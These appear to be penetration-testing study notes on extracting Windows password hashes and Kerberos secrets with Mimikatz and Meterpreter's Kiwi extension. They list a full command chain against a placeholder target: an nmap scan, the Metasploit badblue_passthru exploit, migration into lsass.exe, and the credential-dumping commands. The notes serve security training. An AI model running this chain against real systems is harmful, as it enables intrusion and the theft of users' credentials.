- Mimikatz is a Windows ***post-exploitation tool*** that allows for the ***extraction of clear-text passwords***, **hashes**, and ***Kerberos tickets*** from memory.
- It can be used to extract hashes from the `lsass.exe` process memory where hashes are cached.
- We can utilize the ***pre-compiled mimikatz executable***, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension `Kiwi`.
Note: ***Mimikatz will require elevated privileges in order to run correctly.***

***

### Practical

##### Scan the Target
```
nmap Target
nmap -sV -p80 Target
```

##### Metasploit
```
use exploit/windows/http/badblue_passthru
set rhosts Target
run
```

##### Migrate the current Process into `lsass.exe`
```
pgrep lsass
migrate pid

or

migrate -N lsass.exe
```

#### Load Kiwi
##### Dump Administrator NTLM hash
```
creds_all
```

##### Extract all the Users NTLM hash
```
lsa_dump_sam
```

##### Find the `syskey`
```
lsa_dump_secrets
```